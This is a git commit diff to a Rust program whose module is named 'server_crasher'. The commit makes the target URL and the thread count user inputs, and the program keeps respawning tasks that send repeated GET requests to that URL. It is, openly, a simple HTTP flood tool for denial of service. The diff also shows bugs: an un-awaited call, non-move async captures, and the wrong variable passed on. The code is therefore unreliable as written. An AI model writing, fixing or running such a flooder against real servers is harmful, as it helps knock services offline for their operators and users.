8c8f27694d4c2d9747cc606da5e1edb0f98fa6cd
Vít Němec <vitek2004@seznam.cz>
2023-05-19 18:14:33 +0200

    nefunguje mozna kdyz to chvilku jede

--- src/main.rs
+++ src/main.rs
@@ -1,9 +1,39 @@
 mod server_crasher;
 
 use server_crasher::start;
+use std::io::stdin;
+use std::panic;
 
 #[tokio::main]
+
 async fn main() {
-    start(2).await;
+    
+    loop {
+        let result = panic::catch_unwind(|| {
+            let mut input_string = String::new();
+            let mut input_threads = String::new();
+
+            println!("Enter URL: ");
+            stdin().read_line(&mut input_string).expect("Failed to read line");
+            let url = input_string.trim();
+
+            println!("Enter number of threads: ");
+            stdin().read_line(&mut input_threads).expect("Failed to read line");
+            let input_threads = match input_threads.trim().parse::<u32>() {
+            Ok(num) => num,
+            Err(_) => panic!("Not a valid u32"),
+        };
+
+            let url = format!("{}?response_type=json", url);
+            println!("{}", url);
+
+            start(input_threads, input_string);
+        });
+
+        if let Err(_) = result {
+            println!("Bad Input");
+        }
+    }
+
 }
 
--- src/server_crasher.rs
+++ src/server_crasher.rs
@@ -2,10 +2,10 @@ use std::task::Poll;
 
 use futures::FutureExt;
 
-async fn contact() {
+async fn contact(url: String) {
     let client = reqwest::Client::new();
     let response = client
-        .get("https://random-data-api.com/api/v2/blood_types?response_type=json")
+        .get(url)
         .send()
         .await
         .expect("Failed to fetch the response");
@@ -17,11 +17,12 @@ async fn contact() {
     }
 }
 
-pub async fn start(threads: u32) {
+pub fn start(threads: u32, url: String) {
     let mut handles = Vec::new();
     for _i in 0..threads {
+        let url_clone = url.clone();
         let handle = tokio::spawn(async {
-            contact().await;
+            contact(url_clone).await;
         });
         handles.push(handle);
     }
@@ -34,8 +35,9 @@ pub async fn start(threads: u32) {
             Some(index) => index,
             None => { continue;}, // skip the current iteration and go to the next one
         };
+        let url_clone = url.clone();
         let handle = tokio::spawn(async {
-            contact().await;
+            contact(url_clone).await;
         });
         handles[index] = handle;
     }
